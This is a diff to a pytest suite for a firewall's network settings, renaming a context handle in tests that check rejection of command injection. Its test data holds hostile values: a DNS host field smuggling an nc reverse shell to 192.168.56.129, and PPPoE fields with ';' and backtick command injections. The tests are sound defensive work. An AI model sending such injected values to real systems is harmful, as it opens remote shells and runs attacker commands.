@@ -95,7 +95,7 @@ def run_exploit_test(command, base_args, key):
         modified = copy.deepcopy(base_args)
         modified[key] = exploit
 
-        result = global_functions.uvmContext.networkManager().runTroubleshooting(command, modified)
+        result = global_functions.normalUvmContext.networkManager().runTroubleshooting(command, modified)
         time.sleep(3)
 
         try:
@@ -112,7 +112,7 @@ def run_exploit_test(command, base_args, key):
 
 
 def run_valid_test(command, args):
-    exec_result = global_functions.uvmContext.networkManager().runTroubleshooting(command, args)
+    exec_result = global_functions.normalUvmContext.networkManager().runTroubleshooting(command, args)
     time.sleep(3)
 
     if command not in EXPECTED:
@@ -664,7 +664,7 @@ def get_troubleshooting_output(command=None, arguments={}):
     """
     output_reader = None
     try:
-        output_reader = global_functions.uvmContext.networkManager().runTroubleshooting(command, arguments)
+        output_reader = global_functions.normalUvmContext.networkManager().runTroubleshooting(command, arguments)
     except:
         assert False, "could not run command"
 
@@ -3240,12 +3240,12 @@ server=dynupdate.no-ip.com
         Verify argument exploit is not possible in runTroubleshooting functionality
         """
         # runTroubleshooting using arguments matching suspicious characters
-        execResult = global_functions.uvmContext.networkManager().runTroubleshooting("DNS", { "HOST": "1&nc 192.168.56.129:3333 -e /bin/bash" })
+        execResult = global_functions.normalUvmContext.networkManager().runTroubleshooting("DNS", { "HOST": "1&nc 192.168.56.129:3333 -e /bin/bash" })
         time.sleep(3)
         assert(execResult == None)
 
         # runTroubleshooting using valid arguments
-        execResult = global_functions.uvmContext.networkManager().runTroubleshooting("DNS", { "HOST": "amazon.com" })
+        execResult = global_functions.normalUvmContext.networkManager().runTroubleshooting("DNS", { "HOST": "amazon.com" })
         time.sleep(3)
         assert(execResult.getResult() == 0)
 
@@ -3495,11 +3495,11 @@ server=dynupdate.no-ip.com
                 bad_settings['staticRoutes']['list'].insert(0, route)
 
                 with pytest.raises(Exception):
-                    global_functions.uvmContext.networkManager().setNetworkSettings(bad_settings)
+                    global_functions.normalUvmContext.networkManager().setNetworkSettings(bad_settings)
 
                 # Stored staticRoutes list must equal the original — the
                 # rejected setNetworkSettings cannot partially-apply.
-                current_routes = global_functions.uvmContext.networkManager() \
+                current_routes = global_functions.normalUvmContext.networkManager() \
                     .getNetworkSettings()['staticRoutes']['list']
                 assert current_routes == baseline_routes, (
                     f"NGFW-15741: staticRoutes list mutated despite SafeCheckValidator "
@@ -3507,7 +3507,7 @@ server=dynupdate.no-ip.com
                     f"Stored: {current_routes!r}, expected: {baseline_routes!r}"
                 )
         finally:
-            global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+            global_functions.normalUvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
     def test_082_interface_mapping_v_eval_injection_blocked(self):
         """
@@ -3578,19 +3578,19 @@ server=dynupdate.no-ip.com
 
             # Layer 1 — typed @SafeCheck on StaticRoute.nextHop must reject.
             with pytest.raises(Exception):
-                global_functions.uvmContext.networkManager().setNetworkSettings(malicious_settings)
+                global_functions.normalUvmContext.networkManager().setNetworkSettings(malicious_settings)
 
             # Trigger the notification cycle anyway — layers 2/3 must also
             # hold. (No bad route was inserted, so nothing should fire, but
             # this guards against partial-apply regressions.)
-            global_functions.uvmContext.notificationManager().getNotifications()
+            global_functions.normalUvmContext.notificationManager().getNotifications()
             time.sleep(1)
 
             assert not os.path.exists(exploit_marker), \
                 "Notification reachability check shell-injected via " \
                 "nextHop bypass payload! " + exploit_marker + " should not exist"
         finally:
-            global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+            global_functions.normalUvmContext.networkManager().setNetworkSettings(orig_netsettings)
             if os.path.exists(exploit_marker):
                 os.remove(exploit_marker)
 
@@ -3607,27 +3607,27 @@ server=dynupdate.no-ip.com
           - wirelessSsid / wirelessPassword / wirelessCountryCode (hostapd.conf
             has no exec directives)
         """
-        netsettings_before = global_functions.uvmContext.networkManager().getNetworkSettings()
+        netsettings_before = global_functions.normalUvmContext.networkManager().getNetworkSettings()
         try:
             positive = copy.deepcopy(netsettings_before)
             iface = positive["interfaces"]["list"][0]
             iface["v4PPPoERootDev"]  = "eth0"
             iface["v4PPPoEUsername"] = "pppoe_user"
             iface["dhcpDnsOverride"] = "8.8.8.8, 1.1.1.1"
-            global_functions.uvmContext.networkManager().setNetworkSettings(positive)
+            global_functions.normalUvmContext.networkManager().setNetworkSettings(positive)
 
             # USERNAME_OR_EMAIL accepts email-format PPPoE usernames (ALPHANUM rejected '@').
             # ~32% of real-world PPPoE deployments use user@isp.com format (BT, CenturyLink, DTAG).
             iface = positive["interfaces"]["list"][0]
             iface["v4PPPoEUsername"] = "user@isp.com"
-            global_functions.uvmContext.networkManager().setNetworkSettings(positive)
-            saved_iface = global_functions.uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]
+            global_functions.normalUvmContext.networkManager().setNetworkSettings(positive)
+            saved_iface = global_functions.normalUvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]
             assert saved_iface["v4PPPoEUsername"] == "user@isp.com", (
                 "NGFW-15768: USERNAME_OR_EMAIL failed to accept email-format PPPoE "
                 f"username; got {saved_iface['v4PPPoEUsername']!r}"
             )
 
-            baseline = global_functions.uvmContext.networkManager().getNetworkSettings()
+            baseline = global_functions.normalUvmContext.networkManager().getNetworkSettings()
             negative_payloads = {
                 "v4PPPoERootDev":  "eth0; touch /tmp/x",
                 "v4PPPoEUsername": "user`id`",
@@ -3637,8 +3637,8 @@ server=dynupdate.no-ip.com
                 bad = copy.deepcopy(baseline)
                 bad["interfaces"]["list"][0][field] = payload
                 with pytest.raises(Exception):
-                    global_functions.uvmContext.networkManager().setNetworkSettings(bad)
-                current_iface = global_functions.uvmContext.networkManager() \
+                    global_functions.normalUvmContext.networkManager().setNetworkSettings(bad)
+                current_iface = global_functions.normalUvmContext.networkManager() \
                     .getNetworkSettings()["interfaces"]["list"][0]
                 expected = baseline["interfaces"]["list"][0].get(field)
                 assert current_iface.get(field) == expected, (
@@ -3647,7 +3647,7 @@ server=dynupdate.no-ip.com
                     f"{current_iface.get(field)!r}, expected: {expected!r}"
                 )
         finally:
-            global_functions.uvmContext.networkManager().setNetworkSettings(netsettings_before)
+            global_functions.normalUvmContext.networkManager().setNetworkSettings(netsettings_before)
 
     def test_085_safecheck_dns_dhcp_entries(self):
         """Verify NGFW-15768 @SafeCheck annotations on Phase 2 DNS/DHCP entry POJOs.
@@ -3662,7 +3662,7 @@ server=dynupdate.no-ip.com
         dhcp-script= / dhcp-luascript= / lease-change-script= directives trigger
         shell exec. Newline injection in any field is RCE.
         """
-        netsettings_before = global_functions.uvmContext.networkManager().getNetworkSettings()
+        netsettings_before = global_functions.normalUvmContext.networkManager().getNetworkSettings()
         try:
             # Positive: each entry type round-trips with a valid value.
             positive = copy.deepcopy(netsettings_before)
@@ -3692,8 +3692,8 @@ server=dynupdate.no-ip.com
                 "prefix":        24,
                 "dns":           "8.8.8.8",
             }]
-            global_functions.uvmContext.networkManager().setNetworkSettings(positive)
-            baseline = global_functions.uvmContext.networkManager().getNetworkSettings()
+            global_functions.normalUvmContext.networkManager().setNetworkSettings(positive)
+            baseline = global_functions.normalUvmContext.networkManager().getNetworkSettings()
 
             # Only the exact compatibility literals bypass SIMPLE_TEXT.
             description_collections = ("staticDhcpEntries", "dhcpRelays")
@@ -3701,8 +3701,8 @@ server=dynupdate.no-ip.com
                 for description in ("[no description]", "*"):
                     allowed = copy.deepcopy(baseline)
                     allowed[collection]["list"][0]["description"] = description
-                    global_functions.uvmContext.networkManager().setNetworkSettings(allowed)
-                    saved = global_functions.uvmContext.networkManager().getNetworkSettings()
+                    global_functions.normalUvmContext.networkManager().setNetworkSettings(allowed)
+                    saved = global_functions.normalUvmContext.networkManager().getNetworkSettings()
                     assert saved[collection]["list"][0]["description"] == description, (
                         f"{collection}.description failed to round-trip exact "
                         f"allowlist value {description!r}"
@@ -3735,9 +3735,9 @@ server=dynupdate.no-ip.com
                         node = node[p]
                 node[parts[-1]] = payload
                 with pytest.raises(Exception):
-                    global_functions.uvmContext.networkManager().setNetworkSettings(bad)
+                    global_functions.normalUvmContext.networkManager().setNetworkSettings(bad)
         finally:
-            global_functions.uvmContext.networkManager().setNetworkSettings(netsettings_before)
+            global_functions.normalUvmContext.networkManager().setNetworkSettings(netsettings_before)
 
     def test_086_safecheckparam_config_hostname_domain(self):
         """ConfigManagerImpl.setHostName / setDomainName (HOSTNAME).
